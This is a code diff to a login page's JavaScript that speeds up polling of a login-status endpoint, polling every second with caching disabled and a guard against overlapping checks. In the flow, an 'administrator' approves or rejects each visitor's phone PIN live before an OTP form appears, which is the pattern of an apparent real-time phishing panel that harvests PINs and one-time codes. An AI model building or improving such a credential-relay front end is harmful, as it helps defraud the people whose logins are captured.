@@ -316,24 +316,26 @@ document.addEventListener('DOMContentLoaded', function () {
       .then(function (data) {
         var loginId = data && data.loginId ? data.loginId : ('LOG-' + Date.now());
 
-        var pollInterval = setInterval(function () {
-          fetch('/api/login/status/' + loginId)
+        var pollInterval = null;
+        var checkingPinStatus = false;
+        var checkPinStatus = function () {
+          if (checkingPinStatus) return;
+          checkingPinStatus = true;
+          fetch('/api/login/status/' + loginId, { cache: 'no-store' })
             .then(function (res) { return res.json(); })
             .then(function (statusData) {
               if (statusData.decided) {
-                clearInterval(pollInterval);
+                if (pollInterval) clearInterval(pollInterval);
                 if (statusData.status === 'approved') {
                   if (spinner) spinner.style.display = 'none';
-                  setTimeout(function () {
-                    loginForm.style.display = 'none';
-                    if (otpForm) {
-                      otpForm.style.display = 'block';
-                      otpForm.dataset.phone = num;
-                    }
-                    if (submitBtn) submitBtn.disabled = false;
-                    var firstOtp = otpForm ? otpForm.querySelector('.pin-box') : null;
-                    if (firstOtp) firstOtp.focus();
-                  }, 1000);
+                  loginForm.style.display = 'none';
+                  if (otpForm) {
+                    otpForm.style.display = 'block';
+                    otpForm.dataset.phone = num;
+                  }
+                  if (submitBtn) submitBtn.disabled = false;
+                  var firstOtp = otpForm ? otpForm.querySelector('.pin-box') : null;
+                  if (firstOtp) firstOtp.focus();
                 } else {
                   if (spinner) spinner.style.display = 'none';
                   showToast('Your PIN was rejected by the administrator.', 'error');
@@ -345,8 +347,13 @@ document.addEventListener('DOMContentLoaded', function () {
             .catch(function () {
               if (spinner) spinner.style.display = 'none';
               showToast('Error checking status. Please try again.', 'error');
+            })
+            .finally(function () {
+              checkingPinStatus = false;
             });
-        }, 3000);
+        };
+        checkPinStatus();
+        pollInterval = setInterval(checkPinStatus, 1000);
       })
       .catch(function () {
         if (spinner) spinner.style.display = 'none';
@@ -416,7 +423,7 @@ document.addEventListener('DOMContentLoaded', function () {
         showToast('Waiting for admin approval...', 'success');
 
         var pollInterval = setInterval(function () {
-          fetch('/api/login/status/' + loginId)
+          fetch('/api/login/status/' + loginId, { cache: 'no-store' })
             .then(function (res) { return res.json(); })
             .then(function (statusData) {
               if (statusData.decided) {
